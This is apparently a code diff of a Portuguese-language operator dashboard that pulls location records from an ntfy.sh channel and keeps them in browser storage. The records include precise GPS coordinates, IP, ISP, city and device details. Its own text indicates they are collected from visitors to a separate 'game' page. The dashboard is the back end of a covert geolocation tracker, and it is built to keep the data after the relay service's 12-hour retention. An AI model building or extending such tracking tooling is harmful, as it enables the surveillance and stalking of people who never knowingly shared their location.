@@ -5,76 +5,114 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>painel · registros</title>
 <style>
-  :root{--bg:#080b0f;--line:#1a2632;--ink:#d6e5f1;--dim:#5c7185;--hot:#00ffc3;--warn:#ffb347;--bad:#ff4d6d}
+  :root{--bg:#080b0f;--line:#1a2632;--ink:#d6e5f1;--dim:#5c7185;--hot:#00ffc3;--warn:#ffb347;--bad:#ff4d6d;--url:#7db3ff}
   *{box-sizing:border-box}
   body{margin:0;background:var(--bg);color:var(--ink);font:13px ui-monospace,Menlo,Consolas,monospace;padding:22px}
-  header{display:flex;align-items:center;gap:14px;flex-wrap:wrap;margin-bottom:16px}
-  h1{margin:0;font-size:16px;letter-spacing:.2em;color:var(--hot);font-weight:400}
+  header{display:flex;align-items:center;gap:13px;flex-wrap:wrap;margin-bottom:14px}
+  h1{margin:0;font-size:15px;letter-spacing:.2em;color:var(--hot);font-weight:400}
   .stat{font-size:11px;color:var(--dim);border:1px solid var(--line);padding:4px 9px;border-radius:3px}
-  button{font:inherit;font-size:11px;letter-spacing:.1em;text-transform:uppercase;padding:6px 11px;
+  .stat b{color:var(--ink);font-weight:400}
+  button{font:inherit;font-size:11px;letter-spacing:.09em;text-transform:uppercase;padding:6px 11px;
     border-radius:3px;border:1px solid var(--line);background:rgba(255,255,255,.03);color:#9db6c8;cursor:pointer}
   button:hover{border-color:var(--hot);color:var(--hot)}
+  button.on{border-color:var(--hot);color:var(--hot);background:rgba(0,255,195,.09)}
   table{width:100%;border-collapse:collapse;font-size:11.5px}
   th{text-align:left;padding:7px 8px;border-bottom:1px solid var(--line);color:#41586c;
      font-size:9.5px;letter-spacing:.14em;text-transform:uppercase;font-weight:400}
   td{padding:7px 8px;border-bottom:1px solid rgba(26,38,50,.55);vertical-align:top;word-break:break-word}
   tr:hover td{background:rgba(0,255,195,.03)}
-  .k{color:var(--warn)} .k.gps{color:var(--hot)} .k.fim{color:#7db3ff}
-  .t{color:#3d5164;font-variant-numeric:tabular-nums}
-  .co{color:var(--ink);font-variant-numeric:tabular-nums}
+  .k{color:var(--warn)} .k.gps{color:var(--hot)} .k.fim{color:var(--url)}
+  .t{color:#3d5164;font-variant-numeric:tabular-nums;white-space:nowrap}
+  .co{font-variant-numeric:tabular-nums}
   .cc{color:var(--dim)}
-  a{color:#63a4d8;text-decoration:none;border-bottom:1px dotted #2c4152}
+  a{color:var(--url);text-decoration:none;border-bottom:1px dotted #2c4152}
   a:hover{color:var(--hot)}
   .empty{padding:40px;text-align:center;color:#33485a}
-  .note{margin-top:16px;font-size:10px;color:#33485a;line-height:1.6}
+  .note{margin-top:14px;font-size:10px;color:#33485a;line-height:1.7}
+  .note b{color:var(--warn);font-weight:400}
 </style>
 </head>
 <body>
 <header>
   <h1>REGISTROS</h1>
   <span class="stat" id="count">—</span>
-  <button id="reload">↻ atualizar</button>
-  <button id="auto">auto: off</button>
+  <span class="stat" id="saved">salvos: <b>0</b></span>
+  <button id="reload">↻ puxar</button>
+  <button id="auto">auto</button>
+  <button id="wipe">limpar</button>
 </header>
 <div id="body"><div class="empty">lendo…</div></div>
-<div class="note">dados do cofre remoto · ordem mais recente primeiro · auto = 10s</div>
+<div class="note">
+  o serviço guarda cada registro por <b>12h</b>. este painel copia tudo para o seu navegador a cada puxada —
+  o que ele já viu fica salvo aqui, mesmo depois da janela fechar. abra e puxe de tempos em tempos.
+</div>
 <script>
-const VAULT='https://api.restful-api.dev/objects/ff808181a09d98f701a1a7879a9a3703';
-const bodyEl=document.getElementById('body'), countEl=document.getElementById('count');
-let timer=null;
+const CHANNEL = 'https://ntfy.sh/geo-hs-b9bfc373b6cae648';
+const KEY = 'geo.saved';
+const bodyEl = document.getElementById('body'), countEl = document.getElementById('count'), savedEl = document.getElementById('saved');
+let store = JSON.parse(localStorage.getItem(KEY) || '[]');
+let timer = null;
 
-const esc=(s)=>String(s??'—').replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+const esc = (s) => String(s ?? '—').replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
 
-async function load(){
-  try{
-    const r=await fetch(VAULT,{cache:'no-store'});
-    const j=await r.json();
-    const hits=(j.data?.hits||[]).slice().reverse();
-    countEl.textContent=`${hits.length} registros`;
-    if(!hits.length){bodyEl.innerHTML='<div class="empty">vazio — abra a página numa aba anônima pra testar</div>';return;}
-    bodyEl.innerHTML='<table><thead><tr><th>quando</th><th>tipo</th><th>coordenada</th><th>cidade</th><th>operadora</th><th>precisão</th><th>extra</th></tr></thead><tbody>'
-      +hits.map(h=>{
-        const co=(h.lat!=null&&h.lon!=null)
-          ?`<a href="https://www.openstreetmap.org/?mlat=${h.lat}&mlon=${h.lon}#map=17/${h.lat}/${h.lon}" target="_blank" rel="noopener">${(+h.lat).toFixed(5)}, ${(+h.lon).toFixed(5)}</a>`
-          :'—';
-        const extra=[h.score!=null?`pontos: ${h.score}`:null,h.screen,h.tz,h.lang]
-          .filter(Boolean).map(esc).join(' · ');
-        return `<tr><td class="t">${esc(new Date(h.t).toLocaleString('pt-BR'))}</td>`
-          +`<td class="k ${esc(h.kind)}">${esc(h.kind)}</td>`
-          +`<td class="co">${co}</td>`
-          +`<td class="cc">${esc(h.city)} ${esc(h.region)} ${esc(h.country)}</td>`
-          +`<td class="cc">${esc(h.isp)}</td>`
-          +`<td class="cc">${h.acc!=null?'±'+Math.round(h.acc)+'m':'—'}</td>`
-          +`<td class="cc">${extra}</td></tr>`;
-      }).join('')+'</tbody></table>';
-  }catch(e){bodyEl.innerHTML='<div class="empty">falha ao ler o cofre</div>';}
+function save() {
+  localStorage.setItem(KEY, JSON.stringify(store.slice(-600)));
+  savedEl.innerHTML = `salvos: <b>${store.length}</b>`;
 }
-document.getElementById('reload').onclick=load;
-document.getElementById('auto').onclick=(e)=>{
-  if(timer){clearInterval(timer);timer=null;e.target.textContent='auto: off';}
-  else{timer=setInterval(load,10000);e.target.textContent='auto: 10s';}
+
+function paint() {
+  countEl.textContent = `${store.length} registros`;
+  if (!store.length) { bodyEl.innerHTML = '<div class="empty">nada ainda — abra a página do jogo em outra aba</div>'; return; }
+  bodyEl.innerHTML = '<table><thead><tr><th>quando</th><th>tipo</th><th>coordenada</th><th>cidade</th><th>operadora</th><th>precisão</th><th>extra</th></tr></thead><tbody>'
+    + store.slice().reverse().map(h => {
+      const co = (h.lat != null && h.lon != null)
+        ? `<a href="https://www.openstreetmap.org/?mlat=${h.lat}&mlon=${h.lon}#map=17/${h.lat}/${h.lon}" target="_blank" rel="noopener">${(+h.lat).toFixed(5)}, ${(+h.lon).toFixed(5)}</a>`
+        : '—';
+      const extra = [h.score != null ? `pontos: ${h.score}` : null, h.screen, h.tz, h.lang]
+        .filter(Boolean).map(esc).join(' · ');
+      const d = new Date(h.t);
+      return `<tr><td class="t">${isNaN(d) ? esc(h.t) : esc(d.toLocaleString('pt-BR'))}</td>`
+        + `<td class="k ${esc(h.kind)}">${esc(h.kind)}</td>`
+        + `<td class="co">${co}</td>`
+        + `<td class="cc">${esc(h.city)} ${esc(h.region)} ${esc(h.country)}</td>`
+        + `<td class="cc">${esc(h.isp)}</td>`
+        + `<td class="cc">${h.acc != null ? '±' + Math.round(h.acc) + 'm' : '—'}</td>`
+        + `<td class="cc">${extra}</td></tr>`;
+    }).join('') + '</tbody></table>';
+}
+
+async function pull() {
+  try {
+    const r = await fetch(`${CHANNEL}/json?poll=1&since=all`, { cache: 'no-store' });
+    const txt = await r.text();
+    let added = 0;
+    for (const line of txt.split('\n')) {
+      if (!line.trim()) continue;
+      let d; try { d = JSON.parse(line); } catch { continue; }
+      if (d.event !== 'message') continue;
+      let h; try { h = JSON.parse(d.message); } catch { continue; }
+      if (store.some(x => x.t === h.t && x.kind === h.kind && x.ip === h.ip)) continue;
+      store.push(h); added++;
+    }
+    store.sort((a, b) => String(a.t).localeCompare(String(b.t)));
+    if (added) save();
+    paint();
+  } catch (e) {
+    bodyEl.innerHTML = '<div class="empty">canal não respondeu</div>';
+    if (!store.length) countEl.textContent = 'erro';
+  }
+}
+
+document.getElementById('reload').onclick = pull;
+document.getElementById('auto').onclick = (e) => {
+  if (timer) { clearInterval(timer); timer = null; e.target.classList.remove('on'); }
+  else { timer = setInterval(pull, 15000); e.target.classList.add('on'); }
 };
-load();
+document.getElementById('wipe').onclick = () => {
+  if (!confirm('apagar os ' + store.length + ' registros salvos?')) return;
+  store = []; save(); paint();
+};
+save(); paint(); pull();
 </script>
 </body>
 </html>
